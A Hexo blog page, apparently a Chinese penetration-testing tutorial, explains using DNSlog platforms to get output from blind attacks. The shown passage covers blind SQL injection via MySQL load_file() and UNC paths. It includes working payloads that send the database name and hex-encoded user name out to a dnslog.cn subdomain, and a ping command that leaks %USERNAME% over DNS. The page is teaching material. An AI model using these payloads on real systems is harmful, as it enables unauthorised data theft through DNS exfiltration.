@@ -1,0 +1,1438 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/header.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/header.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/header.jpg?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="dnslog," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="joker0xxx3's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="如何利用DNSlog进行更高效率的无回显渗透0.说在前面0.1.DNSlog工具如果有自己的服务器和域名，可以自建一个这样的平台，直接使用BugScan团队开源的工具搭建即可： https:&#x2F;&#x2F;github.com&#x2F;BugScanTeam&#x2F;DNSLog 另外我们也可以使用在线平台： http:&#x2F;&#x2F;ceye.io http:&#x2F;&#x2F;www.dnslog.cn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="如何利用DNSlog进行更高效率的无回显渗透">
+<meta property="og:url" content="http://joker-vip.github.io/2022/03/15/DNSlog/index.html">
+<meta property="og:site_name" content="joker0xxx3&#39;s Blog">
+<meta property="og:description" content="如何利用DNSlog进行更高效率的无回显渗透0.说在前面0.1.DNSlog工具如果有自己的服务器和域名，可以自建一个这样的平台，直接使用BugScan团队开源的工具搭建即可： https:&#x2F;&#x2F;github.com&#x2F;BugScanTeam&#x2F;DNSLog 另外我们也可以使用在线平台： http:&#x2F;&#x2F;ceye.io http:&#x2F;&#x2F;www.dnslog.cn">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474137547808.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474137586461.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474137606461.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474137646353.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474137688778.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474137721423.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474137744626.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474137786992.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474137805571.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474137831054.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474137875065.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/164741379089.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474137987953.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138028813.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138053796.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138106175.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/1647413812656.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138155372.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138238620.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138332709.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138394894.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138431209.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138463926.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138506369.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138558443.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138614997.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138648104.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138662414.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138682579.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138711221.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138743211.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138771739.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138808365.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138858776.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138877460.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138907581.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138934047.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138957377.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474138985237.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474139006791.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474139022835.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474139065207.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474139103220.png">
+<meta property="og:image" content="https://image.3001.net/images/20220316/16474139128777.png">
+<meta property="article:published_time" content="2022-03-15T13:35:35.000Z">
+<meta property="article:modified_time" content="2022-03-16T07:04:31.103Z">
+<meta property="article:author" content="joker0xxx3">
+<meta property="article:tag" content="dnslog">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.3001.net/images/20220316/16474137547808.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://joker-vip.github.io/2022/03/15/DNSlog/"/>
+
+
+
+
+
+  <title>如何利用DNSlog进行更高效率的无回显渗透 | joker0xxx3's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+	<a href="https://github.com/joker-vip" target="_blank" rel="noopener" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+	
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">joker0xxx3's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">现实告诉我： 保持好奇心，享受孤独</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://joker-vip.github.io/2022/03/15/DNSlog/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="joker0xxx3">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="joker0xxx3's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">如何利用DNSlog进行更高效率的无回显渗透</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+		    
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-03-15T21:35:35+08:00">
+                2022-03-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index">
+                    <span itemprop="name">工具</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="如何利用DNSlog进行更高效率的无回显渗透"><a href="#如何利用DNSlog进行更高效率的无回显渗透" class="headerlink" title="如何利用DNSlog进行更高效率的无回显渗透"></a>如何利用DNSlog进行更高效率的无回显渗透</h1><h2 id="0-说在前面"><a href="#0-说在前面" class="headerlink" title="0.说在前面"></a>0.说在前面</h2><h3 id="0-1-DNSlog工具"><a href="#0-1-DNSlog工具" class="headerlink" title="0.1.DNSlog工具"></a>0.1.DNSlog工具</h3><p>如果有自己的服务器和域名，可以自建一个这样的平台，直接使用BugScan团队开源的工具搭建即可：</p>
+<p><a href="https://github.com/BugScanTeam/DNSLog" target="_blank" rel="noopener">https://github.com/BugScanTeam/DNSLog</a></p>
+<p>另外我们也可以使用在线平台：</p>
+<p><a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io</a></p>
+<p><a href="http://www.dnslog.cn/" target="_blank" rel="noopener">http://www.dnslog.cn</a></p>
+<a id="more"></a>
+
+<h4 id="0-1-1-www-dnslog-cn使用方法"><a href="#0-1-1-www-dnslog-cn使用方法" class="headerlink" title="0.1.1.www.dnslog.cn使用方法"></a>0.1.1.<code>www.dnslog.cn</code>使用方法</h4><p>（1）Get SubDomain的意思是获取子域名，这里点击完就给我们一个三级域名。复制完后，打开新网页并粘贴在url上，访问<a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615113119-266d6756-cd8a-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137547808.png" alt="img"></a></p>
+<p>（2）点击完会出现一条DNS记录<a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615113147-370d8f6e-cd8a-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137586461.png" alt="img"></a></p>
+<h5 id="0-1-1-1-注意"><a href="#0-1-1-1-注意" class="headerlink" title="0.1.1.1.注意"></a>0.1.1.1.注意</h5><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615113202-40060a92-cd8a-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137606461.png" alt="img"></a></p>
+<p>这里一直刷新访问网址，并在DNSlog.cn里刷新记录（Refresh Record），可是无论怎么刷新，记录都是只有这几条。因为dns协议的目的是我要访问这个域名，可是不知道对应的ip，我就去问，第一次不知道，第二次不知道，第三次也不知道，那第四次总该记住了，这就是dns缓存了的问题。碰到一个新来的域名我不知道，但是问了几次之后我就知道了，我就不需要再查询了。这就是为什么怎么刷新都不会有新的记录了。</p>
+<h6 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h6><p>像下图这样在前面加一个1.，使它变成新的域名，再重新访问后，再刷新记录，就有了</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615113220-4a5a79d8-cd8a-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137646353.png" alt="img"></a></p>
+<h4 id="0-1-2-ceye-io使用方法"><a href="#0-1-2-ceye-io使用方法" class="headerlink" title="0.1.2.ceye.io使用方法"></a>0.1.2.<code>ceye.io</code>使用方法</h4><p>和<code>http://www.dnslog.cn</code>使用方法类似</p>
+<p>（1）login进入后，会给我们一个三级域名，在用户详情页”Profile”中自己的域名标识符”Identifier”。对于每个用户，都有唯一的域名标识符如 xxx.ceye.io 。所有来自于 xxx.ceye.io 或 *.xxx.ceye.io 的DNS查询和HTTP请求都会被记录。</p>
+<p>（2）我们复制完，打开新网页并粘贴在url上，访问</p>
+<p>（3）最后可以在”Records”里的”DNS Query”中查看</p>
+<h2 id="1-什么是DNSlog"><a href="#1-什么是DNSlog" class="headerlink" title="1.什么是DNSlog"></a>1.什么是DNSlog</h2><p>我们都知道DNS就是将域名解析为ip，用户在浏览器上输入一个域名<code>A.com</code>，就要靠DNS服务器将A.com解析到它的真实ip127.0.0.1，这样就可以访问127.0.0.1服务器上的相应服务。<br>那么DNSlog是什么。DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对域名<code>www.baidu.com</code>等的访问信息，类似日志文件。</p>
+<h2 id="2-DNSlog回显原理"><a href="#2-DNSlog回显原理" class="headerlink" title="2.DNSlog回显原理"></a>2.DNSlog回显原理</h2><p>前面说DNSlog就是日志，那怎么用DNSlog进行注入并回显信息呢。我们得再了解一个多级域名的概念。<br>[域名分级与域名解析过程(DNS)](<a href="https://blog.csdn.net/weixin_50464560/article/d" target="_blank" rel="noopener">https://blog.csdn.net/weixin_50464560/article/d</a> etails/117607146)<br>因特网采用层次树状结构命名方法。域是名字空间中一个可被管理的划分（按机构组织划分），域可被划分为子域，子域可再被划分，即形成了顶级域名、二级域名、三级域名等。从右向左为顶级域名、二级域名、三级域名等，用点隔开。如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tieba.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>它由三个标号组成， com即为顶级域名，baidu为二级域名，tieba即为三级域名。且域名不区分大小写。</p>
+<p>再来看一个图：</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615113242-57d33758-cd8a-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137688778.png" alt="img"></a></p>
+<p>通俗的说就是我有个已注册的域名<code>a.com</code>，我在域名代理商那里将域名设置对应的ip 1.1.1.1 上，这样当我向dns服务器发起a.com的解析请求时，DNSlog中会记录下他给a.com解析，解析值为1.1.1.1，而我们这个解析的记录的值就是我们要利用的地方。</p>
+<p>看个直观一点的例子来理解：<br>ping命令的时候会用到DNS解析所以我就用ping命令做个实验。</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615113304-64ae6696-cd8a-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137721423.png" alt="img"></a></p>
+<p>DNSlog.cn中也记录了下来</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615113316-6bd9ff66-cd8a-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137744626.png" alt="img"></a></p>
+<p>可以看到解析的日志会把%USERNAME%的值给带出来，因为系统在ping命令之前会将%USERNAME%的值解析出来，然后再和a.com拼接起来，最后ping命令执行将XF.a.com一起发给DNS服务器请求解析域名对应的ip地址，这个过程被记录下来就是DNSlog，看到这里应该有点感觉了。原理上只要能进行DNS请求的函数都可能存在DNSlog注入。</p>
+<h2 id="3-DNSlog通常用在哪些地方"><a href="#3-DNSlog通常用在哪些地方" class="headerlink" title="3.DNSlog通常用在哪些地方"></a>3.DNSlog通常用在哪些地方</h2><p>大家在渗透测试的时候可能会遇到一下这些情况：</p>
+<ul>
+<li>挖到一个有SQL盲注的站点，可是用sqlmap跑需要频繁请求，最后导致ip被ban</li>
+<li>发现疑似命令注入的洞，但是目标站点什么也不显示，无法确认是不是有洞</li>
+</ul>
+<p>总之就是目标不让信息显示出来，如果能发送请求，那么就可以尝试咱这个办法——用DNSlog来获取回显</p>
+<p>（1）SQL注入中的盲注</p>
+<p>（2）XSS盲打</p>
+<p>（3）无回显的命令执行</p>
+<p>（4）无回显的SSRF</p>
+<p>（5）无回显的XXE（Blind XXE）</p>
+<h3 id="3-1-SQL注入盲注"><a href="#3-1-SQL注入盲注" class="headerlink" title="3.1.SQL注入盲注"></a>3.1.SQL注入盲注</h3><p>在sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显</p>
+<h4 id="3-1-1-UNC路径"><a href="#3-1-1-UNC路径" class="headerlink" title="3.1.1.UNC路径"></a>3.1.1.UNC路径</h4><p><a href="https://baike.baidu.com/item/UNC路径/3231808" target="_blank" rel="noopener">UNC路径</a></p>
+<p>注意：读取远程文件就要用到UNC路径</p>
+<p>UNC路径就是类似\softer这样的形式的网络路径,就是\。</p>
+<p>例子：<code>\\\www.mss.cn\2.txt</code></p>
+<p>注意：这种用反斜杠是微软喜欢反着来，在微软文件夹里查询需要反斜杠；如果是在别的地方如url里查询就要用正斜杠<code>/</code>，即//<a href="http://www.mss.cn/2.txt，如果硬要用反斜杠，得另外加两个反斜杠来转义，即要四个反斜杠，很麻烦。如：" target="_blank" rel="noopener">www.mss.cn/2.txt，如果硬要用反斜杠，得另外加两个反斜杠来转义，即要四个反斜杠，很麻烦。如：</a>(select load_file(concat(‘\\‘,(select datab ase()),’.xxxx.ceye.io\abc’)))</p>
+<h4 id="3-1-2-mysql的load-file-函数条件和secure-file-priv设置"><a href="#3-1-2-mysql的load-file-函数条件和secure-file-priv设置" class="headerlink" title="3.1.2.mysql的load_file()函数条件和secure_file_priv设置"></a>3.1.2.mysql的load_file()函数条件和secure_file_priv设置</h4><p>例子：</p>
+<p>select load_file(‘/etc/hosts’)</p>
+<p>例如上面的例子是有条件限制的：</p>
+<p>1、必须有权限读取并且文件必须完全可读。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from mysql.user)&gt;0 &#x2F;*如果结果返回正常，说明具有读写权限.*&#x2F;</span><br><span class="line">and (select count(*) from mysql.user)&gt;0 &#x2F;*返回错误，应该是管理员给数据库账户降权了*&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615113339-7963b370-cd8a-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137786992.png" alt="img"></a></p>
+<p>我们查看mysql这个库中user表中的字段有这些<a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615113817-1f420756-cd8b-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137805571.png" alt="img"></a></p>
+<p>通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。<code>show variables like &#39;%secure%&#39;</code>;查看load_file()可以读取的磁盘。<br>（1）当secure_file_priv为空，就可以读取磁盘的目录。<br>（2）当secure_file_priv为G:\，就可以读取G盘的文件。<br>（3）当secure_file_priv为null，load_file就不能加载文件。（注意NULL不是我们要的空，NULL和空的类型不一样）</p>
+<p>secure_file_priv设置通过设置my.ini来配置，不能通过SQL语言来修改，因为它是只读变量，secure_file_priv设置具体看这里：</p>
+<p>若secure_auth为ON，则用以下方法变为OFF（mysql查询默认是不区分大小写的）<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615120936-7f566e08-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137831054.png" alt="img"></a><br>secure_file_priv不能通过此方法修改，因为报错为Variable ‘XXX’ is a read only variable。报错原因及修改方法为：参数为只读参数，需要在mysql.ini配置文件中更改该参数，之后重启数据库<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121004-8fd2506c-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137875065.png" alt="img"></a><br>将secure_file_priv为空的正确方法（注意NULL不是我们要的空，NULL和空的类型不一样）<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121018-98876c60-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/164741379089.png" alt="img"></a><br>secure_file_priv=””就是可以load_flie任意磁盘的文件。</p>
+<p>2、欲读取文件必须在服务器上</p>
+<p>3、必须指定文件完整的路径</p>
+<p>4、欲读取文件必须小于<code>max_allowed_packet</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">show global VARIABLES like &#39;max_allowed_packet&#39;;</span><br><span class="line"></span><br><span class="line">如果文件超过了max_allowed_packet，则结果如下：</span><br><span class="line">mysql&gt; select load_file(&quot;C:&#x2F;Users&#x2F;XF&#x2F;Desktop&#x2F;杀猪盘&#x2F;index.php&quot;);</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">| load_file(&quot;C:&#x2F;Users&#x2F;XF&#x2F;Desktop&#x2F;杀猪盘&#x2F;index.php&quot;)  |</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">| NULL                                              |</span><br><span class="line">+---------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>　　如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限。</p>
+<p>在windows下，如果NTFS设置得当，是不能读取相关的文件的，当遇到administrators才能访问的文件，users就不能实现用load_file读取文件了。</p>
+<h5 id="3-1-2-1-注意事项"><a href="#3-1-2-1-注意事项" class="headerlink" title="3.1.2.1.注意事项"></a>3.1.2.1.注意事项</h5><ol>
+<li>dnslog注入只能用于windows，因为load_file这个函数的主要目的还是读取本地的文件，所以我们在拼接的时候需要在前面加上两个//，这两个斜杠的目的是为了使用load_file可以查询的unc路径。但是Linux服务器没有unc路径，也就无法使用dnslog注入。</li>
+<li>在进行注入的时候，需要先判断该位置是否存在注入，然后再在后面拼接代码，因为对照payload进行输入的话，可能会出现dnslog网站接收不到的情况，这是我在进行复现的时候遇到的情况。</li>
+<li>在域名的后面，我们需要拼接一个文件名，这是因为load_file函数只能请求文件，如果不加后面的文件名，同样无法得到显示。</li>
+</ol>
+<h4 id="3-1-3-过程"><a href="#3-1-3-过程" class="headerlink" title="3.1.3.过程"></a>3.1.3.过程</h4><p>(1)这里字符型注入和数字型注入都不会回显，是盲注，我们就用DNSlog注入</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121036-a3163e04-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474137987953.png" alt="img"></a></p>
+<p>这里读取远程文件就要用到UNC路径，UNC路径就是类似\softer这样的形式的网络路径,就是\。例子：<code>\\\www.mss.cn\2.txt</code>。微软里喜欢跟别人反着来，所以在微软文件夹里查询用反斜杠<code>\\</code>；而这里如果要在url中得用正斜杠<code>/</code>，不然查不出来，如果硬要用反斜杠，得另外加反斜杠来转义，unc路径就要四个反斜杠，很麻烦。如：(select load_file(concat(‘\\‘,(select datab ase()),’.xxxx.ceye.io\abc’)))</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当前库名payload：and (select load_file(concat(&#39;&#x2F;&#x2F;&#39;,(select datab ase()),&#39;.6.eudspa.dnslog.cn&#x2F;a&#39;)))</span><br><span class="line"></span><br><span class="line">注意：后面这个a文件存不存在并不重要，随便写个文件就行，只要发生了DNS解析，我们就能看到我们所需要的东西，如这里的库名，但是这个文件必须要写，因为这是load_file函数所需要的条件。</span><br></pre></td></tr></table></figure>
+
+<p>注：当前库名<a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121057-afc10e04-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138028813.png" alt="img"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">用户名payload：and (select load_file(concat(&#39;&#x2F;&#x2F;&#39;,(select hex(user())),&#39;.wlgbdd.dnslog.cn&#x2F;a&#39;)))</span><br><span class="line"></span><br><span class="line">注意：为什么要对查询的内容进行hex编码？</span><br><span class="line">如果我们要查询的用户名中存在特殊字符：如!@#$%^&amp;</span><br><span class="line">最后在请求DNS服务器时变成：!@#$%^&amp;*.upa46v.dnslog.cn</span><br><span class="line">存在特殊字符的域名无法解析。因此在DNS日志中也找不到我们查询的数据。</span><br><span class="line">所以在我们查询时，当不确定查询结果是否存在特殊字符时，最好先将其hex编码后在带入查询。</span><br></pre></td></tr></table></figure>
+
+<p>将hex(用户名)去hex解码，得出结果为root@localhost</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20210615121115-ba577182-cd8f-1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20220316/16474138053796.png" alt="img"></a></p>
